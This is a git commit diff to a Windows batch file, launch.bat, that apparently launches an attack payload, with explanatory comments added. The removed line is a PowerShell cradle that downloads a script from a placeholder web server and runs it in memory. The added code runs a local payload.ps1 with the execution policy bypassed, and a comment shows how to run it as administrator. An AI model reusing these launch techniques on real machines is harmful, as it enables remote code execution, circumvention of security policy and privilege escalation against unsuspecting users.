0ec24d321bb1d34f8cc487f08fde2cf31214c654
Real0xdom <pranavpanchal2000@gmail.com>
2022-06-25 12:35:56 +0530

    Added some explaination to code

--- launch.bat
+++ launch.bat
@@ -1,14 +1,14 @@
-
+:: This bat file will run the payload which is payload.ps1 in this case
 ::  this prevents the contents of the batch file from being printed to the command prompt
 @ECHO OFF
 
-:: this gets the directory that the batch file is in.
-:: SET ThisScriptsDirectory=%~dp0
+:: below code executes payload.ps1 file 
+:: start PowerShell : starts powershell in windows 
+:: -NoProfile : A potential problem that could affect PowerShell Pros is that it’s possible for them to have variables -
+::  or other settings set in their PowerShell profile that could cause your script to not perform correctly
+:: -ExecutionPolicy Bypass : execution policy is currently configured to not allow scripts to be ran. This argument bypasses that policy
 
-:: just appends the PowerShell script filename to the script directory to get the full path to the PowerShell script file
-:: SET PowerShellScriptPath=%ThisScriptsDirectory%MyPowerShellScript.ps1
-
-:: this is the one that actually calls the PowerShell script and contains the magic.
-:: PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& '%PowerShellScriptPath%'";
-
-powershell "IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');"
+start PowerShell -NoProfile -ExecutionPolicy Bypass -file payload.ps1
+:: If your script needs to be run as admin for some reason use option below 
+:: -Verb RunAs : This will make your powershell script to be run as admin
+:: eg. start PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%PowerShellScriptPath%""' -Verb RunAs}";
